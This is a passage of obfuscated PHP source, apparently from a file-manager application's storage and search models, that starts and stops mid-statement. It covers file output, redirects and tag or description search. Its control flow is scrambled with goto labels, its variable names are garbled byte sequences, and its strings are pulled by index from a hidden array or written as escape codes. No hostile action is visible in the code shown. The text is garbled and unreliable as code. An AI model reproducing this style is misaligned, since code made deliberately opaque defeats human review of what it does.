$e¨ÜÇ∫Í‹’ = $f«éÈ¬ıÁß[8] . $this->pathEncode($c‹°™œÜâ„) . $B‡ªÉ≤˘Î[$f«éÈ¬ıÁß[168]]; goto Fı°–œ«ª‚; côÖÔ„‚ıó: } public function link($eñÿåÈªù…, $dºôÇßáÍü = array()) { return parent::link($eñÿåÈªù…, $dºôÇßáÍü); } public function fileOut($Eàç ÍÎªÛ, $a∑Âéáñ‚± = false, $aòç∑ÑÿÃë = false, $f«óÒà˜º† = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[Öíæ€“”≠éÏË][1339])) { return parent::fileOutServer($Eàç ÍÎªÛ, $a∑Âéáñ‚±, $aòç∑ÑÿÃë, $f«óÒà˜º†); } parent::fileOut($Eàç ÍÎªÛ, $a∑Âéáñ‚±, $aòç∑ÑÿÃë, $f«óÒà˜º†); } public function fileOutImage($a‘îµõœÔΩ, $aèö˜ÉÖìõ = 250) { if (strstr($this->endpoint, $_SERVER[Öíæ€“”≠éÏË][1339])) { return parent::fileOutImageServer($a‘îµõœÔΩ, $aèö˜ÉÖìõ); } parent::fileOutImage($a‘îµõœÔΩ, $aèö˜ÉÖìõ); } public function fileOutLink($Fã˘üö¡èÍ) { $Có»ôç÷€¯ =& $_SERVER[Öíæ€“”≠éÏË]; if (substr($Fã˘üö¡èÍ, 0, 7) == $Có»ôç÷€¯[1213]) { $Fã˘üö¡èÍ = $Có»ôç÷€¯[1214] . substr($Fã˘üö¡èÍ, 7); } header($Có»ôç÷€¯[159] . $Fã˘üö¡èÍ); die; } public function getHost() { $CÏÓÚÿ¥›µ =& $_SERVER[Öíæ€“”≠éÏË]; $A≠≥Œîâ±£ = str_rtrim(parent::getHost(), $CÏÓÚÿ¥›µ[8] . $this->bucket); $A≠≥Œîâ±£ = explode($CÏÓÚÿ¥›µ[177], $A≠≥Œîâ±£); return $A≠≥Œîâ±£[0] . $CÏÓÚÿ¥›µ[177] . $this->bucket . $CÏÓÚÿ¥›µ[95] . $A≠≥Œîâ±£[1]; } } goto B´Ô≥∂Ó„ø; B”◊úäø∞≤: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($E¡∂¡µ»ﬂÈ) { goto Eãëà˘Ö±©; bö∞ŸáÏë˜: if (!$a∏◊¿Ô¢Ñ’) { return array(); } $e®±úì”°∫ = $a∏◊¿Ô¢Ñ’[$fä¨®‡ÜùÚ[168]]; $c¿÷É”Ωûà = $fä¨®‡ÜùÚ[7]; goto eÍâÜÆº±π; eÍâÜÆº±π: if (!$a∏◊¿Ô¢Ñ’[$fä¨®‡ÜùÚ[168]]) { $B´«–√±ãÀ = array_to_keyvalue($bØêÃ√ÒπΩ, $fä¨®‡ÜùÚ[33], $fä¨®‡ÜùÚ[168]); $e®±úì”°∫ = implode($fä¨®‡ÜùÚ[47], $B´«–√±ãÀ); $c¿÷É”Ωûà = $fä¨®‡ÜùÚ[1951]; } $C©†“™˜≈é = explode($fä¨®‡ÜùÚ[47], trim($e®±úì”°∫, $fä¨®‡ÜùÚ[47])); return array($c¿÷É”Ωûà, $C©†“™˜≈é); goto fÇãçêõ™û; Eãëà˘Ö±©: $fä¨®‡ÜùÚ =& $_SERVER[Öíæ€“”≠éÏË]; $bØêÃ√ÒπΩ = KodIO::fileTypeList(); $a∏◊¿Ô¢Ñ’ = $bØêÃ√ÒπΩ[$E¡∂¡µ»ﬂÈ]; goto bö∞ŸáÏë˜; fÇãçêõ™û: } public function listPathType($eΩ’÷áçæî) { $Bˆá¢Ùÿ°¡ =& $_SERVER[Öíæ€“”≠éÏË]; $döÓÿ±⁄àî = $this->fileTypeWhere($eΩ’÷áçæî); if (!$döÓÿ±⁄àî) { return array(); } $E™ÖéÕœ∂· = array($Bˆá¢Ùÿ°¡[563] => SourceModel::TYPE_USER, $Bˆá¢Ùÿ°¡[564] => USER_ID, $Bˆá¢Ùÿ°¡[560] => 0, $Bˆá¢Ùÿ°¡[561] => $döÓÿ±⁄àî); return $this->listSource($E™ÖéÕœ∂·); } public function listSearch($aß¯Ñ˘èåµ, $FÆ∂¥µã–≥ = 300) { goto CÙ∑ÑßÓÛ; CÂ´ıâ∏˘ã: $this->_listMake($cﬂ⁄≥Èà´Œ); return $cﬂ⁄≥Èà´Œ; goto c–≠Úõ«ïÏ; D∆€‚Éƒ©ƒ: $this->_listSearchBindPinyin($aß¯Ñ˘èåµ, $Aµâ¡ñ‰Ú∏, $Eì”·Á¿∫∫); $this->alias($F œ∞≈ÓÙÕ[530])->_makeOrder(); $Aµâ¡ñ‰Ú∏ = $this->parseWhereLike($Aµâ¡ñ‰Ú∏); goto F¬ªÔ›Œ¯±; b¡Êò‡È‹ˆ: $this->_listSearchTag($cﬂ⁄≥Èà´Œ, $aß¯Ñ˘èåµ, $dúÀΩî„Úˆ); $this->_listSearchGroupTag($cﬂ⁄≥Èà´Œ, $aß¯Ñ˘èåµ, $dúÀΩî„Úˆ); $this->_listDataApply($cﬂ⁄≥Èà´Œ[$F œ∞≈ÓÙÕ[367]]); goto CÂ´ıâ∏˘ã; F¬ªÔ›Œ¯±: $cﬂ⁄≥Èà´Œ = $this->distinct(!0)->field($Eì”·Á¿∫∫)->where($Aµâ¡ñ‰Ú∏)->selectPage($FÆ∂¥µã–≥); $this->_listSearchFileContent($cﬂ⁄≥Èà´Œ, $aß¯Ñ˘èåµ, $dúÀΩî„Úˆ); $this->_listSearchDesc($cﬂ⁄≥Èà´Œ, $aß¯Ñ˘èåµ, $dúÀΩî„Úˆ); goto b¡Êò‡È‹ˆ; CÙ∑ÑßÓÛ: $F œ∞≈ÓÙÕ =& $_SERVER[Öíæ€“”≠éÏË]; if (isset($aß¯Ñ˘èåµ[$F œ∞≈ÓÙÕ[1795]]) && $aß¯Ñ˘èåµ[$F œ∞≈ÓÙÕ[1795]]) { $aß¯Ñ˘èåµ[$F œ∞≈ÓÙÕ[1795]] = str_replace($F œ∞≈ÓÙÕ[381], $F œ∞≈ÓÙÕ[1952], trim($aß¯Ñ˘èåµ[$F œ∞≈ÓÙÕ[1795]])); } $Aµâ¡ñ‰Ú∏ = $this->_parseSearchWhere($aß¯Ñ˘èåµ); goto DñŸªâÁæê; DñŸªâÁæê: if (!isset($Aµâ¡ñ‰Ú∏[$F œ∞≈ÓÙÕ[424]])) { $Aµâ¡ñ‰Ú∏[$F œ∞≈ÓÙÕ[424]] = 0; } $Eì”·Á¿∫∫ = $F œ∞≈ÓÙÕ[1953]; $dúÀΩî„Úˆ = $Eì”·Á¿∫∫; goto D∆€‚Éƒ©ƒ; c–≠Úõ«ïÏ: } private function _listSearchFileContent(&$CÉ˜±óºÖà, $eâƒì°Ø®Ø, $Bçì—ò’‹Â) { goto Aø˜€ç•Ωû; Aø˜€ç•Ωû: $BÊàñŸÁÍ• =& $_SERVER[Öíæ€“”≠éÏË]; if (!$eâƒì°Ø®Ø[$BÊàñŸÁÍ•[1795]] || $CÉ˜±óºÖà[$BÊàñŸÁÍ•[364]][$BÊàñŸÁÍ•[351]] > 1) { return; } $bè ƒÖõçÛ = $this->_parseSearchWhere($eâƒì°Ø®Ø); goto eÇ±æ”Ê≤ë; eÇ±æ”Ê≤ë: if (!isset($bè ƒÖõçÛ[$BÊàñŸÁÍ•[28]]) || !is_array($eâƒì°Ø®Ø[$BÊàñŸÁÍ•[448]])) { return; } $bè ƒÖõçÛ[$BÊàñŸÁÍ•[448]] = array($BÊàñŸÁÍ•[7], $eâƒì°Ø®Ø[$BÊàñŸÁÍ•[448]]); unset($bè ƒÖõçÛ[$BÊàñŸÁÍ•[28]]); goto A•ãØ’‘ã±; d¢ûË√‹åö: $CÉ˜±óºÖà[$BÊàñŸÁÍ•[367]] = array_merge($DÃÉˆÊà™∂, $CÉ˜±óºÖà[$BÊàñŸÁÍ•[367]]); $CÉ˜±óºÖà[$BÊàñŸÁÍ•[364]][$BÊàñŸÁÍ•[365]] += count($DÃÉˆÊà™∂); goto AÕúÌç≈‰Ï; A•ãØ’‘ã±: unset($eâƒì°Ø®Ø[$BÊàñŸÁÍ•[448]]); $DÃÉˆÊà™∂ = $this->field($Bçì—ò’‹Â)->where($bè ƒÖõçÛ)->limit($BÊàñŸÁÍ•[1954])->select(); if (!$DÃÉˆÊà™∂ || count($DÃÉˆÊà™∂) == 0) { return; } goto d¢ûË√‹åö; AÕúÌç≈‰Ï: } private function _listSearchTag(&$b†º–øÔıÚ, $Cßœ˘öãÉ‹, $fµÛâÌ¯´Ú) { goto AÓ·Â†ÃªÉ; c≤äÌãﬁâÇ: $dÛ¨åçêçΩ = array(); $c’ë÷ó§‰ó = $Cßœ˘öãÉ‹[$DÃâ≤ﬁ§€é[1795]]; foreach ($E”êÖ›∫∆– as $CÑ√–‘»Â—) { $däÜ±ç„ÃÊ = $CÑ√–‘»Â—[$DÃâ≤ﬁ§€é[28]]; $D·ÕÏ∂…Ÿã = str_replace($DÃâ≤ﬁ§€é[50], $DÃâ≤ﬁ§€é[33], Pinyin::encode($däÜ±ç„ÃÊ)); if (stripos($däÜ±ç„ÃÊ, $c’ë÷ó§‰ó) !== !1 || stripos($D·ÕÏ∂…Ÿã, $c’ë÷ó§‰ó) !== !1) { $dÛ¨åçêçΩ[] = $CÑ√–‘»Â—[$DÃâ≤ﬁ§€é[394]]; } } goto b¶êí¨ûçƒ; AÓ·Â†ÃªÉ: $DÃâ≤ﬁ§€é =& $_SERVER[Öíæ€“”≠éÏË]; if (!$Cßœ˘öãÉ‹[$DÃâ≤ﬁ§€é[1795]] || $b†º–øÔıÚ[$DÃâ≤ﬁ§€é[364]][$DÃâ≤ﬁ§€é[351]] > 1) { return; } $E”êÖ›∫∆– = Model($DÃâ≤ﬁ§€é[1955])->listData(); goto c≤äÌãﬁâÇ; b¶êí¨ûçƒ: if (!$dÛ¨åçêçΩ) { return; } $E¢„ëè“åù = array($DÃâ≤ﬁ§€é[420] => array($DÃâ≤ﬁ§€é[7], $dÛ¨åçêçΩ), $DÃâ≤ﬁ§€é[1538] => USER_ID); $fﬁ¡Á‚õÕ£ = Model($DÃâ≤ﬁ§€é[421])->field($DÃâ≤ﬁ§€é[76])->where($E¢„ëè“åù)->select(); goto fâ Üî´µÙ; fâ Üî´µÙ: $fﬁ¡Á‚õÕ£ = array_to_keyvalue($fﬁ¡Á‚õÕ£, $DÃâ≤ﬁ§€é[33], $DÃâ≤ﬁ§€é[76]); $Fìà≥ÜÛá¬ = array_unique($fﬁ¡Á‚õÕ£); $this->_listSearchMerge($b†º–øÔıÚ, $Cßœ˘öãÉ‹, $fµÛâÌ¯´Ú, $Fìà≥ÜÛá¬); goto f±è∞ÙÆ—É; f±è∞ÙÆ—É: } private function _listSearchDesc(&$bŸÕ√ÿæÇı, $F¢≠ÎÚ¥äú, $FóôÆâ√Ó¿) { goto CÁ˘≠–€õê; CÁ˘≠–€õê: $aœ‡Ïúàêä =& $_SERVER[Öíæ€“”≠éÏË]; if (!$F¢≠ÎÚ¥äú[$aœ‡Ïúàêä[1795]] || $bŸÕ√ÿæÇı[$aœ‡Ïúàêä[364]][$aœ‡Ïúàêä[351]] > 1) { return; } $FÀ¥÷äÚ®¨ = $this->listSearchChildren($F¢≠ÎÚ¥äú[$aœ‡Ïúàêä[479]]); goto A´Ó¡Ö™ê‹; Dè´‘Ûááó: $eı¿∑Ø∏ËÖ = Model($aœ‡Ïúàêä[546])->field($aœ‡Ïúàêä[396])->where($búπÌˆ•⁄ƒ)->select(); $b∆ÂÖ —“® = array_to_keyvalue($eı¿∑Ø∏ËÖ, $aœ‡Ïúàêä[33], $aœ‡Ïúàêä[396]); $this->_listSearchMerge($bŸÕ√ÿæÇı, $F¢≠ÎÚ¥äú, $FóôÆâ√Ó¿, $b∆ÂÖ —“®); goto fÉÖ¯ßè¯“; A´Ó¡Ö™ê‹: $FÀ¥÷äÚ®¨ = array_unique($FÀ¥÷äÚ®¨); if (!$FÀ¥÷äÚ®¨) { return; } $búπÌˆ•⁄ƒ = array($aœ‡Ïúàêä[396] => array($aœ‡Ïúàêä[7], $FÀ¥÷äÚ®¨), $aœ‡Ïúàêä[93] => $aœ‡Ïúàêä[432], $aœ‡Ïúàêä[372] => array($aœ‡Ïúàêä[380], $aœ‡Ïúàêä[1797] . $F¢≠ÎÚ¥äú[$aœ‡Ïúàêä[1795]] . $aœ‡Ïúàêä[1797])); goto Dè´‘Ûááó; fÉÖ¯ßè¯“: } private function _listSearchGroupTag(&$fµ’ºàµô•, $AÓÚáπÛßá, $e¥∫ÜáŒ¿≥) { goto A≤âı÷ëòÛ; dÜ«Œ‹∞±â: $Eé∞≥ÿÔÃŒ = array_to_keyvalue($Eé∞≥ÿÔÃŒ, $EÒ•†˜••¬[33], $EÒ•†˜••¬[76]); $F›ÜéÖµôø = array_unique($Eé∞≥ÿÔÃŒ); $this->_listSearchMerge($fµ’ºàµô•, $AÓÚáπÛßá, $e¥∫ÜáŒ¿≥, $F›ÜéÖµôø); goto fÇºÎ∫Ñô•; bÆÕü≠ùîß: $fÙêÙ“•ÜÙ = array(); $DÙŒÑ‚Ü”Ô = $AÓÚáπÛßá[$EÒ•†˜••¬[1795]]; foreach ($EØüÁüÒ—˜[$EÒ•†˜••¬[367]] as $A‡‚ÃÍÓÛë) { $EÉ∏ÍÂ–åâ = $A‡‚ÃÍÓÛë[$EÒ•†˜••¬[28]]; $Dºôí»¥Á÷ = str_replace($EÒ•†˜••¬[50], $EÒ•†˜••¬[33], Pinyin::encode($EÉ∏ÍÂ–åâ)); if (stripos($EÉ∏ÍÂ–åâ, $DÙŒÑ‚Ü”Ô) !== !1 || stripos($Dºôí»¥Á÷, $DÙŒÑ‚Ü”Ô) !== !1) { $fÙêÙ“•ÜÙ[] = $A‡‚ÃÍÓÛë[$EÒ•†˜••¬[394]]; } } goto eæ¿øÕå»; A≤âı÷ëòÛ: $EÒ•†˜••¬ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$AÓÚáπÛßá[$EÒ•†˜••¬[1795]] || $fµ’ºàµô•[$EÒ•†˜••¬[364]][$EÒ•†˜••¬[351]] > 1 || !$AÓÚáπÛßá[$EÒ•†˜••¬[479]]) { return; } $A´Æº£ÌÁè = $this->sourceInfo($AÓÚáπÛßá[$EÒ•†˜••¬[479]]); goto C∆ﬂ·”ÀÙì; C∆ﬂ·”ÀÙì: if (!$A´Æº£ÌÁè || $A´Æº£ÌÁè[$EÒ•†˜••¬[405]] != SourceModel::TYPE_GROUP) { return; } $B¥íœ∫ΩË€ = $A´Æº£ÌÁè[$EÒ•†˜••¬[485]]; $EØüÁüÒ—˜ = Model($EÒ•†˜••¬[1956])->get($B¥íœ∫ΩË€); goto bÆÕü≠ùîß; eæ¿øÕå»: if (!$fÙêÙ“•ÜÙ) { return; } $FªÂÙŸœˆÒ = array($EÒ•†˜••¬[420] => array($EÒ•†˜••¬[7], $fÙêÙ“•ÜÙ), $EÒ•†˜••¬[1538] => 0, $EÒ•†˜••¬[29] => $EÒ•†˜••¬[1819] . $B¥íœ∫ΩË€); $Eé∞≥ÿÔÃŒ = Model($EÒ•†˜••¬[421])->field($EÒ•†˜••¬[76])->where($FªÂÙŸœˆÒ)->select(); goto dÜ«Œ‹∞±â; fÇºÎ∫Ñô•: } private function _listSearchMerge(&$eƒØŒÚê≈”, $bùÿ–„ó∑», $d›¯á™œªí, $F≈ô∫Íã¿) { goto f…ÂùÜˆââ; DÖÌÙˆ••ç: $fá‰øÖÌÛÕ = $this->field($d›¯á™œªí)->where($b∂å’±∫Æè)->select(); if (!$fá‰øÖÌÛÕ) { return; } $eìΩ©Ö’Áä = array(); goto cÕ¯€•øÕÈ; f…ÂùÜˆââ: $FﬂœåÕÕà =& $_SERVER[Öíæ€“”≠éÏË]; if (!$F≈ô∫Íã¿) { return; } $BåﬁÚƒ¥·Ø = array_to_keyvalue($eƒØŒÚê≈”[$FﬂœåÕÕà[367]], $FﬂœåÕÕà[33], $FﬂœåÕÕà[396]); goto d∞é©äÑîﬁ; d∞é©äÑîﬁ: $cêﬁàƒÜ™… = array_diff($F≈ô∫Íã¿, $BåﬁÚƒ¥·Ø); if (!$cêﬁàƒÜ™…) { return; } $b∂å’±∫Æè = array($FﬂœåÕÕà[396] => array($FﬂœåÕÕà[7], $cêﬁàƒÜ™…)); goto DÖÌÙˆ••ç; cÕ¯€•øÕÈ: foreach ($fá‰øÖÌÛÕ as $f °ä≠ÙüÆ) { if ($this->_listSearchFilter($f °ä≠ÙüÆ, $bùÿ–„ó∑»)) { $eìΩ©Ö’Áä[] = $f °ä≠ÙüÆ; } } $eƒØŒÚê≈”[$FﬂœåÕÕà[367]] = array_merge($eìΩ©Ö’Áä, $eƒØŒÚê≈”[$FﬂœåÕÕà[367]]); $eƒØŒÚê≈”[$FﬂœåÕÕà[364]][$FﬂœåÕÕà[365]] += count($eìΩ©Ö’Áä); goto DøÕÎï§æå; DøÕÎï§æå: } private function _listSearchFilter($cï£Ãú§◊ä, $Aò¡∫âı¶) { goto d™æ‰˘∫Ç«; fùã◊–Üøä: if (isset($Aò¡∫âı¶[$bñ¯ØõÙ√Ë[576]]) && $Aò¡∫âı¶[$bñ¯ØõÙ√Ë[576]] != $cï£Ãú§◊ä[$bñ¯ØõÙ√Ë[435]]) { return !1; } return !0; goto bææ≈‚€äŒ; d™æ‰˘∫Ç«: $bñ¯ØõÙ√Ë =& $_SERVER[Öíæ€“”≠éÏË]; $D®ùÂ›ÁÖ« = $cï£Ãú§◊ä[$bñ¯ØõÙ√Ë[404]] == $bñ¯ØõÙ√Ë[87]; if (!strstr($cï£Ãú§◊ä[$bñ¯ØõÙ√Ë[503]], $bñ¯ØõÙ√Ë[47] . $Aò¡∫âı¶[$bñ¯ØõÙ√Ë[479]] . $bñ¯ØõÙ√Ë[47])) { return !1; } goto a«”Ãº–æ©; a«”Ãº–æ©: if (isset($Aò¡∫âı¶[$bñ¯ØõÙ√Ë[406]]) && $Aò¡∫âı¶[$bñ¯ØõÙ√Ë[406]] != $bñ¯ØõÙ√Ë[1761]) { if ($Aò¡∫âı¶[$bñ¯ØõÙ√Ë[406]] == $bñ¯ØõÙ√Ë[77] && !$D®ùÂ›ÁÖ«) { return !1; } if ($Aò¡∫âı¶[$bñ¯ØõÙ√Ë[406]] != $bñ¯ØõÙ√Ë[77] && $D®ùÂ›ÁÖ«) { return !1; } if (!strstr($cï£Ãú§◊ä[$bñ¯ØõÙ√Ë[168]], $bñ¯ØõÙ√Ë[47] . $Aò¡∫âı¶[$bñ¯ØõÙ√Ë[406]] . $bñ¯ØõÙ√Ë[47])) { return !1; } } if (isset($Aò¡∫âı¶[$bñ¯ØõÙ√Ë[1957]]) && $Aò¡∫âı¶[$bñ¯ØõÙ√Ë[1957]] < $cï£Ãú§◊ä[$bñ¯ØõÙ√Ë[78]]) { return !1; } if (isset($Aò¡∫âı¶[$bñ¯ØõÙ√Ë[1958]]) && $Aò¡∫âı¶[$bñ¯ØõÙ√Ë[1958]] > $cï£Ãú§◊ä[$bñ¯ØõÙ√Ë[78]]) { return !1; } goto fùã◊–Üøä; bææ≈‚€äŒ: } public function listSearchChildren($EÉôŸ‡§ûﬂ, $Bçèêø¶íë = 5000) { goto eÚ√›ÂÚ¶Ü; Eì§êÎ√ò÷: $DéÆìÙáåÙ = array($D·ÙÕÓ†Ù∑[503] => array($D·ÙÕÓ†Ù∑[380], $eáºΩá⁄éà[$D·ÙÕÓ†Ù∑[503]] . $eáºΩá⁄éà[$D·ÙÕÓ†Ù∑[396]] . $D·ÙÕÓ†Ù∑[527])); $bËòÑ”…ŸÎ = $this->field($D·ÙÕÓ†Ù∑[396])->cache(null, 600)->where($DéÆìÙáåÙ)->count(); if ($bËòÑ”…ŸÎ > $Bçèêø¶íë) { return $this->_listSearchChildrenNear($EÉôŸ‡§ûﬂ, $Bçèêø¶íë); } goto b£˜Ç¶≠Ü⁄; b£˜Ç¶≠Ü⁄: $A¶ÎÆøà£î = $this->field($D·ÙÕÓ†Ù∑[396])->where($DéÆìÙáåÙ)->select(); $cıŸ•ﬂ≤ßÚ = array_to_keyvalue($A¶ÎÆøà£î, $D·ÙÕÓ†Ù∑[33], $D·ÙÕÓ†Ù∑[396]); return $cıŸ•ﬂ≤ßÚ; goto E≤¶≥øØˆŸ; eÚ√›ÂÚ¶Ü: $D·ÙÕÓ†Ù∑ =& $_SERVER[Öíæ€“”≠éÏË]; $cıŸ•ﬂ≤ßÚ = array(); $eáºΩá⁄éà = $this->sourceInfo($EÉôŸ‡§ûﬂ); goto Eì§êÎ√ò÷; E≤¶≥øØˆŸ: } private function _listSearchChildrenNear($B˜©Íπå™Ô, $DÍΩùﬂÑâ§) { goto aÑÔ–êŒçó; A‡≤á„÷ı±: if (!$eÎœ£®°â‰) { return $e•◊ÁÌ’ïç; } $f¢˜ê»Ñ—Ì = array($cçñ…—òõå[479] => array($cçñ…—òõå[7], $eÎœ£®°â‰)); $f•ÆÔ„ä‹Ô = $this->field($cçñ…—òõå[1959])->where($f¢˜ê»Ñ—Ì)->limit($DÍΩùﬂÑâ§)->select(); goto A∏ÿÑúÿìﬁ; aÑÔ–êŒçó: $cçñ…—òõå =& $_SERVER[Öíæ€“”≠éÏË]; $e•◊ÁÌ’ïç = array(); $f¢˜ê»Ñ—Ì = array($cçñ…—òõå[479] => $B˜©Íπå™Ô); goto fﬁµìéﬂÑ; fﬁµìéﬂÑ: $f•ÆÔ„ä‹Ô = $this->field($cçñ…—òõå[1959])->where($f¢˜ê»Ñ—Ì)->select(); $eÎœ£®°â‰ = array_to_keyvalue(array_filter_by_field($f•ÆÔ„ä‹Ô, $cçñ…—òõå[404], $cçñ…—òõå[87]), $cçñ…—òõå[33], $cçñ…—òõå[396]); $e•◊ÁÌ’ïç = array_merge($e•◊ÁÌ’ïç, array_to_keyvalue($f•ÆÔ„ä‹Ô, $cçñ…—òõå[33], $cçñ…—òõå[396])); goto A‡≤á„÷ı±; A∏ÿÑúÿìﬁ: $e•◊ÁÌ’ïç = array_merge($e•◊ÁÌ’ïç, array_to_keyvalue($f•ÆÔ„ä‹Ô, $cçñ…—òõå[33], $cçñ…—òõå[396])); $e•◊ÁÌ’ïç = array_slice($e•◊ÁÌ’ïç, 0, $DÍΩùﬂÑâ§); return $e•◊ÁÌ’ïç; goto e≠›÷¿ﬁıÈ; e≠›÷¿ﬁıÈ: } private function _listSearchBindPinyin($C≥°á·óƒÜ, &$aø∏ÚÌªÁÊ, &$Fˆ…ˆì´”√) { goto b›Í∂’ƒ÷î; bá˘ÊÓ€∫: $Fˆ…ˆì´”√ = $AøÑ◊Ùê◊ò[1961] . str_replace($AøÑ◊Ùê◊ò[47], $AøÑ◊Ùê◊ò[1962], $Fˆ…ˆì´”√); $aïâë◊öáÌ = $aø∏ÚÌªÁÊ[$AøÑ◊Ùê◊ò[28]]; unset($aø∏ÚÌªÁÊ[$AøÑ◊Ùê◊ò[28]]); goto D¢Úã•Ü∫·; D¢Úã•Ü∫·: foreach ($aø∏ÚÌªÁÊ as $Cœ©˜ƒ©Ωﬁ => $BÖ‡åô…Ö≈) { $B¡πïëÌ•¥[$AøÑ◊Ùê◊ò[1961] . $Cœ©˜ƒ©Ωﬁ] = $BÖ‡åô…Ö≈; } foreach ($aïâë◊öáÌ as $Fπàû€åß) { $B¡πïëÌ•¥[] = array($AøÑ◊Ùê◊ò[1963] => $Fπàû€åß, $AøÑ◊Ùê◊ò[968] => $AøÑ◊Ùê◊ò[1799], array($AøÑ◊Ùê◊ò[1964] => $Fπàû€åß, $AøÑ◊Ùê◊ò[1965] => array($AøÑ◊Ùê◊ò[7], array($AøÑ◊Ùê◊ò[445], $AøÑ◊Ùê◊ò[444])))); } $this->join($bçãß›¶î±); goto F”ñà∏´∏°; dŒÁûä¢√é: $bçãß›¶î± = "\114\x45\106\x54\40\x4a\x4f\x49\116\40{$this->tablePrefix}\151\x6f\x5f\x73\x6f\x75\x72\x63\x65\x5f\x6d\145\x74\141\40\x6d\145\x74\141\x20\x6f\156\40\x73\x6f\165\162\x63\x65\x2e\x73\157\165\162\x63\145\111\x44\40\x3d\40\x6d\145\164\x61\56\x73\157\x75\162\143\x65\x49\x44"; $B¡πïëÌ•¥ = array(); $Fˆ…ˆì´”√ = str_replace(array($AøÑ◊Ùê◊ò[229], $AøÑ◊Ùê◊ò[50], $AøÑ◊Ùê◊ò[1960]), $AøÑ◊Ùê◊ò[33], $Fˆ…ˆì´”√); goto bá˘ÊÓ€∫; b›Í∂’ƒ÷î: $AøÑ◊Ùê◊ò =& $_SERVER[Öíæ€“”≠éÏË]; if (!isset($C≥°á·óƒÜ[$AøÑ◊Ùê◊ò[1795]]) || !$C≥°á·óƒÜ[$AøÑ◊Ùê◊ò[1795]]) { return; } if (!Input::check($C≥°á·óƒÜ[$AøÑ◊Ùê◊ò[1795]], $AøÑ◊Ùê◊ò[316]) || strlen($C≥°á·óƒÜ[$AøÑ◊Ùê◊ò[1795]]) < 2) { return; } goto dŒÁûä¢√é; F”ñà∏´∏°: $aø∏ÚÌªÁÊ = $B¡πïëÌ•¥; goto FÇÜ±«Ò†ö; FÇÜ±«Ò†ö: } private function _parseSearchWhere($aÉ›ã‡È∞£) { goto bª·√òÂçø; eÿùﬂ•£ìÍ: if (isset($aÉ›ã‡È∞£[$aÒë‡†Ω«ñ[477]]) && $aÉ›ã‡È∞£[$aÒë‡†Ω«ñ[477]]) { $B∞ÚÙà£Ã∫ = array($aÒë‡†Ω«ñ[1967], $aÉ›ã‡È∞£[$aÒë‡†Ω«ñ[477]]); if ($EÆé≠ ‹ê›[$aÒë‡†Ω«ñ[84]]) { $EÆé≠ ‹ê›[$aÒë‡†Ω«ñ[84]] = array($EÆé≠ ‹ê›[$aÒë‡†Ω«ñ[84]], $B∞ÚÙà£Ã∫, $aÒë‡†Ω«ñ[1968]); } else { $EÆé≠ ‹ê›[$aÒë‡†Ω«ñ[84]] = $B∞ÚÙà£Ã∫; } } if (isset($aÉ›ã‡È∞£[$aÒë‡†Ω«ñ[1957]]) && $aÉ›ã‡È∞£[$aÒë‡†Ω«ñ[1957]] > 0) { $EÆé≠ ‹ê›[$aÒë‡†Ω«ñ[78]] = array($aÒë‡†Ω«ñ[1966], $aÉ›ã‡È∞£[$aÒë‡†Ω«ñ[1957]]); } if (isset($aÉ›ã‡È∞£[$aÒë‡†Ω«ñ[1958]]) && $aÉ›ã‡È∞£[$aÒë‡†Ω«ñ[1958]]) { $B∞ÚÙà£Ã∫ = array($aÒë‡†Ω«ñ[1967], $aÉ›ã‡È∞£[$aÒë‡†Ω«ñ[1958]]); if ($EÆé≠ ‹ê›[$aÒë‡†Ω«ñ[78]]) { $EÆé≠ ‹ê›[$aÒë‡†Ω«ñ[78]] = array($EÆé≠ ‹ê›[$aÒë‡†Ω«ñ[78]], $B∞ÚÙà£Ã∫, $aÒë‡†Ω«ñ[1968]); } else { $EÆé≠ ‹ê›[$aÒë‡†Ω«ñ[78]] = $B∞ÚÙà£Ã∫; } } goto c‘àêÑ‡ÙÃ; FÂà—Ø´µ©: if (isset($aÉ›ã‡È∞£[$aÒë‡†Ω«ñ[1795]]) && trim($aÉ›ã‡È∞£[$aÒë‡†Ω«ñ[1795]])) { $A›è°∑›≈◊ = trim($aÉ›ã‡È∞£[$aÒë‡†Ω«ñ[1795]]); $Dñ—πÆ˜êø = explode($aÒë‡†Ω«ñ[50], $A›è°∑›≈◊); if (strlen($A›è°∑›≈◊) > 2 && (substr($A›è°∑›≈◊, 0, 1) == $aÒë‡†Ω«ñ[116] && substr($A›è°∑›≈◊, -1) == $aÒë‡†Ω«ñ[116]) || substr($A›è°∑›≈◊, 0, 1) == $aÒë‡†Ω«ñ[55] && substr($A›è°∑›≈◊, -1) == $aÒë‡†Ω«ñ[55]) { $A›è°∑›≈◊ = substr($A›è°∑›≈◊, 1, -1); $Dñ—πÆ˜êø = array($A›è°∑›≈◊); } $EÆé≠ ‹ê›[$aÒë‡†Ω«ñ[28]] = array(array($aÒë‡†Ω«ñ[526], $aÒë‡†Ω«ñ[1797] . $A›è°∑›≈◊ . $aÒë‡†Ω«ñ[1797])); if (count($Dñ—πÆ˜êø) > 1) { $EÆé≠ ‹ê›[$aÒë‡†Ω«ñ[28]] = array(); foreach ($Dñ—πÆ˜êø as $F‰µ±π≥ﬂ©) { if (!trim($F‰µ±π≥ﬂ©)) { continue; } $EÆé≠ ‹ê›[$aÒë‡†Ω«ñ[28]][] = array($aÒë‡†Ω«ñ[526], $aÒë‡†Ω«ñ[1797] . trim($F‰µ±π≥ﬂ©) . $aÒë‡†Ω«ñ[1797]); } } } return $EÆé≠ ‹ê›; goto Cü…≤”Àù…; c‘àêÑ‡ÙÃ: if (isset($aÉ›ã‡È∞£[$aÒë‡†Ω«ñ[576]]) && $aÉ›ã‡È∞£[$aÒë‡†Ω«ñ[576]]) { $EÆé≠ ‹ê›[] = array($aÒë‡†Ω«ñ[435] => $aÉ›ã‡È∞£[$aÒë‡†Ω«ñ[576]], $aÒë‡†Ω«ñ[433] => $aÉ›ã‡È∞£[$aÒë‡†Ω«ñ[576]], $aÒë‡†Ω«ñ[968] => $aÒë‡†Ω«ñ[1799]); } if (isset($aÉ›ã‡È∞£[$aÒë‡†Ω«ñ[406]]) && $aÉ›ã‡È∞£[$aÒë‡†Ω«ñ[406]]) { $F‡ßÚ‡ã£∫ = $aÉ›ã‡È∞£[$aÒë‡†Ω«ñ[406]]; if ($F‡ßÚ‡ã£∫ == $aÒë‡†Ω«ñ[77]) { $EÆé≠ ‹ê›[$aÒë‡†Ω«ñ[404]] = 1; } else { if ($F‡ßÚ‡ã£∫ == $aÒë‡†Ω«ñ[1969]) { $EÆé≠ ‹ê›[$aÒë‡†Ω«ñ[404]] = 